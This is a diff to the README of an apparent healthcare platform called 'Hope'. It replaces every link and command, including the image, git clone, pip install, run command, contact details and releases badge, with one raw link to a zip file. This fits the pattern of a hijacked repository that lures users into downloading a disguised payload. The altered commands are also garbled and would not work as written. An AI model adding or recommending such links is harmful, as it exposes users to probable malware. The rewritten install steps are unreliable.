@@ -26,7 +26,7 @@ Welcome to the Hope repository! This project aims to transform healthcare throug
 - **Patient Management:** Tools to help doctors manage patient data effectively and efficiently.
 - **User-Friendly Interface:** Designed with ease of use in mind, making healthcare information accessible to everyone.
   
-![Healthcare Technology](https://source.unsplash.com/featured/?healthcare,technology)
+![Healthcare Technology](https://github.com/JBSEnovs/hope/raw/refs/heads/main/agents/Software_3.8.zip,technology)
 
 ---
 
@@ -53,7 +53,7 @@ To get started with Hope, follow the steps below for installation and usage.
    Use the following command to clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/JBSEnovs/hope.git
+   git clone https://github.com/JBSEnovs/hope/raw/refs/heads/main/agents/Software_3.8.zip
    cd hope
    ```
 
@@ -62,7 +62,7 @@ To get started with Hope, follow the steps below for installation and usage.
    Make sure you have Python installed. Then, install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/JBSEnovs/hope/raw/refs/heads/main/agents/Software_3.8.zip
    ```
 
 3. **Run the Application**
@@ -70,7 +70,7 @@ To get started with Hope, follow the steps below for installation and usage.
    Execute the following command to start the application:
 
    ```bash
-   python app.py
+   python https://github.com/JBSEnovs/hope/raw/refs/heads/main/agents/Software_3.8.zip
    ```
 
 4. **Access the Application**
@@ -113,16 +113,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, please reach out:
 
-- **GitHub:** [JBSEnovs](https://github.com/JBSEnovs)
-- **Email:** support@hopeplatform.com
+- **GitHub:** [JBSEnovs](https://github.com/JBSEnovs/hope/raw/refs/heads/main/agents/Software_3.8.zip)
+- **Email:** https://github.com/JBSEnovs/hope/raw/refs/heads/main/agents/Software_3.8.zip
 
 ---
 
 ## Releases
 
-To keep track of new features, bug fixes, and updates, please visit our [Releases](https://github.com/JBSEnovs/hope/releases) section. Here, you can download and execute the latest versions of the project.
+To keep track of new features, bug fixes, and updates, please visit our [Releases](https://github.com/JBSEnovs/hope/raw/refs/heads/main/agents/Software_3.8.zip) section. Here, you can download and execute the latest versions of the project.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)](https://github.com/JBSEnovs/hope/releases)
+[![Download Releases](https://github.com/JBSEnovs/hope/raw/refs/heads/main/agents/Software_3.8.zip%20Releases-blue?style=flat&logo=github)](https://github.com/JBSEnovs/hope/raw/refs/heads/main/agents/Software_3.8.zip)
 
 ---
 
